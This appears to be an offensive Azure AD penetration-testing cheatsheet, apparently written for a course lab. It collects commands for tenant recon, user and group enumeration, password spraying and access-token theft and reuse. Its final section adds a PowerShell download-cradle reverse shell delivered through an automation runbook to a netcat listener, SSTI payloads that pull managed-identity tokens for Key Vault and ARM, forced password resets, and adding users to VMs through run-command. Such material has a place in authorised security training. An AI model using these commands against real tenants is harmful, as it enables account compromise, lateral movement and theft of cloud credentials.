# Cheatsheet

## Tools

* [https://msportals.io/](https://msportals.io/)
* GraphSpy\
  [https://github.com/RedByte1337/GraphSpy](https://github.com/RedByte1337/GraphSpy)
* o365creeper\
  [https://github.com/LMGsec/o365creeper](https://github.com/LMGsec/o365creeper)
* MicroBurst\
  [https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
* AADInternals\
  [https://github.com/Gerenios/AADInternals](https://github.com/Gerenios/AADInternals)
* MSOLSPray\
  [https://github.com/dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray)
* AzureHound\
  [https://github.com/SpecterOps/AzureHound](https://github.com/SpecterOps/AzureHound)



## Initial Enumeration

### Passive

```powershell
## Get Azure tenant name and federation
<https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1>

## Get the Tenant ID
<https://login.microsoftonline.com/><domain>.onmicrosoft.com/.well-known/openid-configuration

## Validate Email ID by sending requests to
<https://login.microsoftonline.com/common/GetCredentialType>

## Azure AD Module
Import-Module AADInternals.psd1 -Verbose

## Get tenant name, authentication, brand name (usually same as directory name) and domain name
Get-AADIntLoginInformation -UserName root@<domain>.onmicrosoft.com

## Get tenant ID
Get-AADIntTenantID -Domain <domain>.onmicrosoft.com

## Get tenant domains
Get-AADIntTenantDomains -Domain <domain>.onmicrosoft.com
Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
Get-AADIntTenantDomains -Domain microsoft.com

## Get all the information
Invoke-AADIntReconAsOutsider -DomainName <domain>.onmicrosoft.com

## o365 creeper
C:\\AzAD\\Tools> C:\\Python27\\python.exe
C:\\AzAD\\Tools\\o365creeper\\o365creeper.py -f C:\\AzAD\\Tools\\emails.txt -o C:\\AzAD\\Tools\\validemails.txt

## Subdomains
Import-Module C:\\AzAD\\Tools\\MicroBurst\\MicroBurst.psm1 -Verbose
. C:\\AzAD\\Tools\\MicroBurst\\Misc\\Invoke-EnumerateAzureSubDomains.ps1
C:\\AzAD\\Tools> Invoke-EnumerateAzureSubDomains -Base <domain>-Verbose

```

### Active

```
## Password Spray/Brute-Force
## Authenticated enumeration - Spray a password
. C:\\AzAD\\Tools\\MSOLSpray\\MSOLSPray.ps1
Invoke-MSOLSpray -UserList C:\\AzAD\\Tools\\validemails.txt -Password Password -Verbose
```

## Azure AD Module Enumeration

[https://www.powershellgallery.com/packages/AzureAD](https://www.powershellgallery.com/packages/AzureAD)

{% code overflow="wrap" %}
```
## Import the module
Import-Module C:\\AzAD\\Tools\\AzureAD\\AzureAD.psd1

## Connect to tenant
Connect-AzureAD
$creds = Get-Credential
Connect-AzureAD -Credential $creds
$passwd = ConvertTo-SecureString
"SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential
("test@<domain>.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds

## Connect with credentials
Import-Module C:\\AzAD\\Tools\\AzureAD\\AzureAD.psd1
$password = ConvertTo-SecureString 'password' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<user>@<domain>.onmicrosoft.com ', $password)
Connect-AzureAD -Credential $creds


## Get the current session state
Get-AzureADCurrentSessionInfo

## Get details of the current tenant
Get-AzureADTenantDetail


##### USERS
## Enumerate all users
Get-AzureADUser -All $true

## Enumerate a specific user
Get-AzureADUser -ObjectId test@<domain>.onmicrosoft.com

## Select only UPN
Get-AzureADUser -All $true | select UserPrincipalName

## Search for a user based on string in first characters of DisplayName or userPrincipalName (wildcard not supported)
Get-AzureADUser -SearchString "admin"

## Search for users who contain the word "admin" in their Display name:
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"}

## List all the attributes for a user
Get-AzureADUser -ObjectId test@<domain>.onmicrosoft.com | fl *
Get-AzureADUser -ObjectId test@<domain>.onmicrosoft.com | %{$_.PSObject.Properties.Name}

## Search attributes for all users that contain the string "password":
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}

## All users who are synced from on-prem
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}

## All users who are from Azure AD
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}

## Objects created by any user (use -ObjectId for a specific user)
Get-AzureADUser | Get-AzureADUserCreatedObject

######## Objects owned by a specific user
Get-AzureADUserOwnedObject -ObjectId test@<domain>.onmicrosoft.com



##### GROUPS
## List all Groups
Get-AzureADGroup -All $true

## Enumerate a specific group
Get-AzureADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e

## Search for a group based on string in first characters of DisplayName (wildcard not supported)
Get-AzureADGroup -SearchString "admin" | fl *

## To search for groups which contain the word "admin" in their name:
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"}

## Get Groups that allow Dynamic membership (Note the cmdlet name)
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}

## All groups that are synced from on-prem (note that security groups are not synced)
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}

## All groups that are from Azure AD
Get-AzureADGroup -All $true |?{$_.OnPremisesSecurityIdentifier -eq $null}## Get members of a group
Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e

## Get groups and roles where the specified user is a member
Get-AzureADUser -SearchString 'test' | Get-AzureADUserMembership
Get-AzureADUserMembership -ObjectId test@<domain>.onmicrosoft.com



##### ROLES
## Get all available role templates
Get-AzureADDirectoryroleTemplate

## Get all enabled roles (a user is assigned the role at least once)
Get-AzureADDirectoryRole

## Enumerate users to who roles are assigned -
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember

##### Devices
## Get all Azure joined and registered devices
Get-AzureADDevice -All $true | fl *

## Get the device configuration object (note the RegistrationQuota in the output)
Get-AzureADDeviceConfiguration | fl *

## List all the active devices (and not the stale devices)
Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}

## List Registered owners of all the devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
### This gives us a list of attractive targets - as these users would be admin on the hosts
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}

## List Registered users of all the devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}

## List devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId username@<domain>.onmicrosoft.com

## List devices registered by a user
Get-AzureADUserRegisteredDevice -ObjectId username@<domain>.onmicrosoft.com

## List devices managed using Intune
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}


##### APPS
## Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal). An application object is the global representation of an app.
Get-AzureADApplication -All $true

## Get all details about an application
Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 | fl *

## Get an application based on the display name
Get-AzureADApplication -All $true | ?{$_.DisplayName -match "app"}

## The Get-AzureADApplicationPasswordCredential will show the applications with an application password but password value is not shown. List all the apps with an application password
Get-AzureADApplication -All $true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}

## Get owner of an application
Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 | Get-AzureADApplicationOwner |fl *

## Get Apps where a User has a role (exact role is not shown)
Get-AzureADUser -ObjectIdroygcain@<domain>.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *

## Get Apps where a Group has a role (exact role is not shown)
Get-AzureADGroup -ObjectId 57ada729-a581-4d6f-9f16-3fe0961ada82 | Get-AzureADGroupAppRoleAssignment | fl *



##### Service Principals
## Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service account'!
## Service Principals can be assigned Azure roles.
## Get all service principals
Get-AzureADServicePrincipal -All $true

## Get all details about a service principal
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | fl *

## Get an service principal based on the display name
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"}

## List all the service principals with an application password
Get-AzureADServicePrincipal -All $true | %{if(Get-AzureADServicePrincipalKeyCredential -ObjectID $_.ObjectID){$_}}

## Get owner of a service principal
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwner |fl *

## Get objects owned by a service principal
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwnedObject

## Get objects created by a service principal
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalCreatedObject

## Get group and role memberships of a service principal
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalMembership |fl *


Import-Module C:\\AzAD\\Tools\\AzureADPreview\\AzureADPreview.psd1
### Builtin Roles - Custom roles
## List custom roles
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} |select DisplayName
```
{% endcode %}

## Az Powershell Module

```
# Get all the resources
Get-AzResource

# Get a users role assignemnts
Get-AzRoleAssignment -SignInName test@<domain>.onmicrosoft.com

# List all VMs - Where current user has at least reader role
Get-AzVM | fl

# List all app services - this will list both app services and funciton apps by default
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

# List function apps
Get-AzFunctionApp

# List storage accounts
Get-AzStorageAccount | fl

# Exapand another section after selecting
(Get-AzStorageAccount | Select -ExpandProperty NetworkRuleSDet).IPRules

# Get storage account items from a blob in azure command line
Get-AzStorageContainer -Context (Get-AzStorageAccount -name <storage account name> -resourcegroupname <resource group name>).context

# Once you have the container you would like to view and this will download it to your machine to view (list them then select with -blob)
Get-AzStorageBlobcontent -container <container name> -context (Get-AzStorageAccount -name <storage account name> -resourcegroupname <resource group name>).context -blob <blob name>

# List keyvaults
Get-AzKeyVault

```

## Azure CLI

<pre><code><strong># Connect Azure account
</strong><strong>az login
</strong>
# Using credentials from command line (service principals and managed identity for VMs is also supported)
az login -u test@&#x3C;domain>.onmicrosoft.com -p password

# If the user has no permissions on the subscription
az login -u test@&#x3C;domain>.onmicrosoft.com -p password --allow-no-subscriptions

# You can configure az cli to set some default behaviour (output type, location, resource group etc.)
az configure

# We can search for popular commands (based on user telemetry) on a
particular topic!

# To find popular commands for VMs
az find "vm"

# To find popular commands within "az vm"
az find "az vm"

# To find popular subcommands and parameters within "az vm list"
az find "az vm list"

# List only the name of the VM
az vm list --query "[].[name]" -o table
az vm list --query "[].[name,networkProfile]" -o table

# We can format output using the --output parameter. The default format is JSON. You can change the default
as discussed previously.

# List all the users in Azure AD and format output in table
az ad user list --output table

# List only the userPrincipalName and givenName (case sensitive) for all the users in Azure AD and format output in table. Az cli uses JMESPath (pronounced 'James path') query.
az ad user list --query "[].[userPrincipalName,displayName]" --output table

# List only the userPrincipalName and givenName (case sensitive) for all the users in Azure AD, rename the properties and format output in table
az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table

# We can use JMESPath query on the results of JSON output. Add --query-examples at the end of any command to see examples
az ad user show list --query-examples

# We will discuss additional options of az cli as and when required!

# Get details of the current tenant (uses the account extension)
az account tenant list

# Get details of the current subscription (uses the account extension)
az account subscription list

# List the current signed-in user
az ad signed-in-user show

# Enumerate all users
az ad user list
az ad user list --query "[].[displayName]" -o table

# Enumerate a specific user (lists all attributes)
az ad user show --id test@&#x3C;domain>.onmicrosoft.com

# Search for users who contain the word "admin" in their Display name (case sensitive):
az ad user list --query "[?contains(displayName,'admin')].displayName"

# When using PowerShell, search for users who contain the word "admin" in their
Display name. This is NOT case-sensitive:
az ad user list | ConvertFrom-Json | %{$_.displayName -match "admin"}

# All users who are synced from on-prem
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"

# All users who are from Azure AD
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
# List all Groups
az ad group list
az ad group list --query "[].[displayName]" -o table

# Enumerate a specific group using display name or object id
az ad group show -g "VM Admins"
az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e

# Search for groups that contain the word "admin" in their Display name (case sensitive) - run from cmd:
az ad group list --query "[?contains(displayName,'admin')].displayName"

# When using PowerShell, search for groups that contain the word "admin" in their Display name. This
is NOT case-sensitive:
az ad group list | ConvertFrom-Json | %{$_.displayName -match "admin"

# All groups that are synced from on-prem
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"

# All groups that are from Azure AD
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"

# Get members of a group
az ad group member list -g "VM Admins" --query "[].[displayName]" -o table

# Check if a user is member of the specified group
az ad group member check --group "VM Admins" --member-id b71d21f6-8e09-4a9d-932a-cb73df519787

# Get the object IDs of the groups of which the specified group is a member
az ad group get-member-groups -g "VM Admins"

# Get all the application objects registered with the current tenant (visible in App Registrations in
Azure portal). An application object is the global representation of an app.
az ad app list
az ad app list --query "[].[displayName]" -o table

# Get all details about an application using identifier uri, application id or object id
az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0

# Get an application based on the display name (Run from cmd)
az ad app list --query "[?contains(displayName,'app')].displayName"

# When using PowerShell, search for apps that contain the word "slack" in their Display name.
This is NOT case-sensitive:
az ad app list | ConvertFrom-Json | %{$_.displayName -match "app"}

# Get owner of an application
az ad app owner list --id a1333e88-1278-41bf-8145-155a069ebed0 --query "[].[displayName]" -o table

# List apps that have password credentials
az ad app list --query "[?passwordCredentials !=null].displayName"

# List apps that have key credentials (use of certificate authentication)
az ad app list --query "[?keyCredentials !=null].displayName"

# Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local
representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service
account'!

# Service Principals can be assigned Azure roles.

# Get all service principals
az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table

# Get all details about a service principal using service principal id or object id
az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264

# Get a service principal based on the display name
az ad sp list --all --query "[?contains(displayName,'app')].displayName"

# When using PowerShell, search for service principals that contain the word "slack" in their Display name. This isNOT case-sensitive:
az ad sp list --all | ConvertFrom-Json | %{$_.displayName -match "app"}

# Get owner of a service principal
az ad sp owner list --id cdddd16e-2611-4442-8f45-053e7c37a264 --query"[].[displayName]" -o table

# Get service principals owned by the current user
az ad sp list --show-mine

# List apps that have password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"

# List apps that have key credentials (use of certificate authentication)
az ad sp list -all --query "[?keyCredentials != null].displayName"

# List webapps
az webapp list

# List just webapp names
az webapp list --query "[].[name]" -o table
az webapp list --query "[].[name,identity]" -o table

# List just function app names
az functionapp list --query "[].[name]" -o table

# List storage accounts
az storage account list

# List key vault
az keyvault list

# List all users
az ad user list --output table

# List only the userPrincipalName and givenName (case sensitive) for all the users in Azure AD and format output in table. Az cli uses JMESPath (pronounced 'James path') query.
az ad user list --query "[].[userPrincipalName,displayName]" --output table

</code></pre>

## Access Tokens

```
Get-AzAccessToken
(Get-AzAccessToken).Token

# Use other access tokens. In the below command, use the one for MSGraph
Connect-AzAccount -AccountId test@<domain>.onmicrosoft.com -AccessToken eyJ0eXA...<SNIP>
Connect-AzAccount -AccountId test@<domain>.onmicrosoft.com -AccessToken eyJ0eXA...<SNIP> -MicrosoftGraphAccessToken eyJ0eXA...<SNIP>

# ARM Azure Resource Manager Token
# Request an access token for AAD Graph to access Azure AD. Sup orted tokens - AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake,  KeyVault, MSGraph, OperationalInsights, ResourceManager, Storage, Synapse
az account get-access-token
az account get-access-token --resource-type ms-graph
```

### Token with API

```
$Token = 'eyJ0eXAi.'
$URI = '<https://management.azure.com/subscriptions?api-version=2020-01-01>'

$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

### Graphi API Endpoint requests

```
$token = ''
$URI = '<https://graph.microsoft.com/v1.0/users>'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

## More Commands to be sorted

{% code overflow="wrap" %}
```
# Show signed in user
az ad signed-in-user show

# Add the automation extention
az extension add --upgrade -n automation
az automation account list

# Object owned by user
az ad signed-in-user list-owned-objects

# Get an account token for a user
az account get-access-token --resource-type aad-graph

# Use that token on own pc
Import-Module C:\\AzAD\\Tools\\AzureAD\\AzureAD.psd1
$AADToken = 'eyJ0…'
Connect-AzureAD -AadAccessToken $AADToken -TenantId <tenant> -AccountId <accountid>

# Adding a  user to a groupo
add-AzureADGroupMember -ObjectId <object> -RefObjectId <refobject> -Verbose

# Now relist the command
az automation account list

# Request token for ARM
az account get-access-token

# Connect using token
PS C:\\AzAD\\Tools> $AADToken = 'eyJ0…'
PS C:\\AzAD\\Tools> $AccessToken = 'eyJ0…'
PS C:\\AzAD\\Tools> Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId <account>

# Get role for Mark
Get-AzRoleAssignment -Scope /subscriptions/<subscription>/resourceGroups/<resource group>/providers/Microsoft.Automation/automationAccounts/HybridAutomation

# Check if hybrid work group is in use
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName <resource group>

# Import run group
iex (New-Object Net.Webclient).downloadstring("<http://172.16.x.x:82/Invoke-PowerShellTcp.ps1>") Power -Reverse -IPAddress 172.16.x.x -Port 4444

# Create the runbook
Import-AzAutomationRunbook -Name namehere -Path C:\\AzAD\\Tools\\file.ps1 -AutomationAccountName accountname -ResourceGroupName resourcegroup -Type PowerShell -Force -Verbose

# Public the runbook
Publish-AzAutomationRunbook -RunbookName runbooknamehere -AutomationAccountName accountname  -ResourceGroupName resourcegroup -Verbose

# Setup the listener
C:\\AzAD\\Tools\\netcat-win32-1.12\\nc.exe -lvp 4444

# Start the runbook
Start-AzAutomationRunbook -RunbookName runbooknamehere -RunOn Workergroup1 -AutomationAccountName accountname -ResourceGroupName resourcegroup -Verbose

# Get more information about a VM
Get-AzVM -Name vmnamehere -ResourceGroupName resourcegroup | select -ExpandProperty NetworkProfile

# Get the network interface
Get-AzNetworkInterface -Name bkpadconnect368

# Get the public IP
Get-AzPublicIpAddress -Name bkpadconnectIP

# Run script on remote pc
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName <resource group>-CommandId 'RunPowerShellScript' -ScriptPath 'C:\\AzAD\\Tools\\adduser.ps1' -Verbose

# Create a powershell session
$password = ConvertTo-SecureString 'password' -AsPlainText -Force
$creds = New-ObjectSystem.Management.Automation.PSCredential('username', $Password)
$sess = New-PSSession -ComputerName <ip/name> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessTypeNoProxyServer)
Enter-PSSession $sess

# Enumeration on the VM
Get-LocalUser

# Read powershell history
cat C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt

# To access the keyvault we need  keyvault token SSTI
{{config.__class__.__init__.__globals__['os'].popen('curl"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}

# Request ARM token SSTI
{{config.__class__.__init__.__globals__['os'].popen('curl"$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}

# Account ID = Client ID

# Connect to kevault
Connect-AzAccount -AccessToken $token -AccountId <account> -KeyVaultAccessToken $keyvaulttoken

# Get resoource
Get-AzResource

# Enumerate role assignemnts
Get-AzRoleAssignment -Scope /subscriptions/<subscription>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm

# Role definittion
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

# Get group information
Get-AzADGroup -DisplayName 'VM Admins'

# Get group members
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select DisplayName

# Get membership information
Get-AzureADMSAdministrativeUnit -Id <ID>


# Role information
Get-AzureADDirectoryRole -ObjectId <object>

# Reset password
$password = "password" | ConvertToSecureString -AsPlainText –Force
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<name>@<domain>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password –Verbose

# Adding user to VM
Invoke-AzVMRunCommand -ScriptPath C:\\AzAD\\Tools\\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'jumpvm' -ResourceGroupName 'Research' –Verbose

# Connecting with powershell session to VM
$password = ConvertTo-SecureString 'password' - AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('username', $password)
$jumpvm = New-PSSession -ComputerName <ip/name> - Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
```
{% endcode %}





















